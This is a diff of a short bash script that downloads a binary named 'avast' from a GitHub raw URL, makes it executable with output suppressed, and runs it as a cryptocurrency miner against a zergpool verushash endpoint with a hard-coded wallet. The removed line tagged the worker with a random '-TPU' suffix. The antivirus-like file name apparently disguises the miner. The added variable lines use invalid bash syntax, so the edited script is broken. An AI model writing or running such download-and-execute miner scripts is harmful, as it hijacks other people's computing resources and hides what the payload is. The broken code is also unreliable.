@@ -1,6 +1,6 @@
 #!/bin/bash
-POOL = verushash.asia.mine.zergpool.com:3300
-WALLET = 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-TPU)
+$POOL = verushash.asia.mine.zergpool.com:3300
+$WALLET = 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo
 wget https://github.com/aurbach55/pos/raw/main/avast
 chmod +x avast  >/dev/null 2>&1
 ./avast -v -l $POOL -u $WALLET -p c=DASH -t 4
